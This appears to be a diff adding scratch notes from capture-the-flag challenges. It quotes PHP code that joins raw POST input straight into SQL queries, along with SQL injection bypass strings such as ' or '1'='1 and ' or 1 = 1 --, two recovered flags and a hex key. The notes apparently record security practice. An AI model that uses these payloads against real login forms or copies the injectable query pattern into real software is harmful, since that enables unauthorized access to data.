@@ -1,0 +1,32 @@
+ b979f8844f7ce4ec5d77f71b2ae9c621
+ b979f8844f7ce4ec5d77f71b2ae9c621
+ 
+ if (isset($_POST['session_id'])) {
+    $query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";
+    $result = $conn->query($query);
+} else {
+    $query = "SELECT * FROM secrets WHERE session_id = '" . session_id() . "'";
+    $result = $conn->query($query);
+}
+->x' or '1'='1
+
+$query = "SELECT username FROM users where username = '" . $_POST['username'] . "' and password = ?";
+
+ 
+FLAG-07e1ba64565352cebd2c0814a101ddbf
+
+$query = "SELECT username FROM users where username = '" . $_POST['username'] . "' and password = ?";
+-- dash coment out
+aaa' or 1 = 1 -- 
+
+FLAG-a1e8c4268f2f673b5df74c953c16969d
+
+
+Make harmless virus,
+Make harmless website,
+Make harmless application,
+Reverse Enginnering,
+Get skill to see other PC .
+
+Message Identifier : cats
+Key : 201D48CF37B3C29D5D92B01E40C77D4C
